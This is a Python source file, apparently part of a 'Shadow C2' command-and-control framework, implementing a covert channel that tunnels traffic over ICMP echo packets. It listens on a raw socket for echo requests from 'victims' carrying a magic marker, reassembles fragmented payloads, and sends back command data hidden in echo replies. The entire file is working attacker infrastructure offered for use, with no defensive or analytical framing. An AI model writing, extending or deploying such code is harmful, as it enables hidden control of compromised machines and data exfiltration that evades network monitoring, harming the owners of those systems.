#!/usr/bin/env python3
"""
Shadow C2 — ICMP Tunneling Channel
C2 over ICMP echo request/reply. Requires root or CAP_NET_RAW.
Data embedded in ICMP payload after 8-byte header.
"""

import socket
import struct
import threading
import logging
import time
import os
from typing import Optional, Callable

from server.c2.channels import BaseChannel
from server.c2.protocol import FragmentManager, Fragment
from server.utils.network import calculate_checksum

logger = logging.getLogger("shadow_c2.channel.icmp")

# ICMP types
ICMP_ECHO_REPLY = 0
ICMP_ECHO_REQUEST = 8

# Magic marker to identify C2 ICMP traffic
ICMP_MAGIC = b"\xC2\x00"


class ICMPChannel(BaseChannel):
    """
    C2 over ICMP echo request/reply.
    - Victims send data in ICMP Echo Request payloads (after ICMP_MAGIC marker)
    - Server responds with ICMP Echo Reply containing command data
    - Requires root privileges for raw sockets
    """

    def __init__(self, handler_callback: Callable = None):
        self.handler_callback = handler_callback
        self._socket: Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self._fragment_mgr = FragmentManager()

    @property
    def channel_type(self) -> str:
        return "icmp"

    @property
    def priority(self) -> int:
        return 4

    @property
    def bandwidth_estimate(self) -> str:
        return "low"

    def start(self):
        """Start ICMP listener (requires root)."""
        if os.geteuid() != 0:
            logger.warning("ICMP channel requires root. Skipping.")
            return

        try:
            self._socket = socket.socket(
                socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self._socket.settimeout(1.0)
            self._running = True

            self._thread = threading.Thread(target=self._listen_loop, daemon=True)
            self._thread.start()
            logger.info("ICMP channel active (raw socket)")
        except Exception as e:
            logger.error(f"Failed to start ICMP channel: {e}")
            self._running = False

    def stop(self):
        self._running = False
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
        if self._thread:
            self._thread.join(timeout=3)

    def is_alive(self) -> bool:
        return self._running

    def _listen_loop(self):
        """Listen for ICMP packets with our magic marker."""
        while self._running:
            try:
                data, addr = self._socket.recvfrom(65535)
                if not data or len(data) < 28:  # IP(20) + ICMP(8) minimum
                    continue

                # Parse IP header (first 20 bytes)
                ip_header = data[:20]
                ihl = (ip_header[0] & 0x0F) * 4
                src_ip = socket.inet_ntoa(ip_header[12:16])

                # Parse ICMP header
                icmp_data = data[ihl:]
                if len(icmp_data) < 8:
                    continue

                icmp_type = icmp_data[0]
                icmp_code = icmp_data[1]
                icmp_checksum = struct.unpack("!H", icmp_data[2:4])[0]
                icmp_id = struct.unpack("!H", icmp_data[4:6])[0]
                icmp_seq = struct.unpack("!H", icmp_data[6:8])[0]
                payload = icmp_data[8:]

                # Only process Echo Requests with our magic marker
                if icmp_type != ICMP_ECHO_REQUEST:
                    continue
                if len(payload) < 2 or payload[:2] != ICMP_MAGIC:
                    continue

                # Extract C2 data (after magic marker)
                c2_data = payload[2:]
                logger.debug(f"ICMP C2 from {src_ip}: {len(c2_data)} bytes")

                # Check for fragments
                if len(c2_data) >= 6:
                    frag = Fragment.unpack(c2_data)
                    if frag and frag.total_frags > 1:
                        reassembled = self._fragment_mgr.add_fragment(frag)
                        if reassembled is None:
                            # Send simple ACK reply
                            self._send_reply(src_ip, icmp_id, icmp_seq, ICMP_MAGIC + b"ACK")
                            continue
                        c2_data = reassembled

                # Process through handler
                response_data = b""
                if self.handler_callback:
                    try:
                        response_data = self.handler_callback(c2_data) or b""
                    except Exception as e:
                        logger.error(f"ICMP handler error: {e}")

                # Send ICMP Echo Reply with response data
                self._send_reply(src_ip, icmp_id, icmp_seq,
                                 ICMP_MAGIC + response_data)

            except socket.timeout:
                continue
            except Exception as e:
                if self._running:
                    logger.error(f"ICMP listener error: {e}")
                    time.sleep(0.5)

    def _send_reply(self, dst_ip: str, icmp_id: int, icmp_seq: int,
                    payload: bytes):
        """Send an ICMP Echo Reply."""
        try:
            # Build ICMP Echo Reply
            icmp_type = ICMP_ECHO_REPLY
            icmp_code = 0
            # Pack without checksum first
            header = struct.pack("!BBHHH", icmp_type, icmp_code, 0,
                                 icmp_id, icmp_seq)
            chksum = calculate_checksum(header + payload)
            header = struct.pack("!BBHHH", icmp_type, icmp_code, chksum,
                                 icmp_id, icmp_seq)

            packet = header + payload
            self._socket.sendto(packet, (dst_ip, 0))
        except Exception as e:
            logger.error(f"Failed to send ICMP reply to {dst_ip}: {e}")
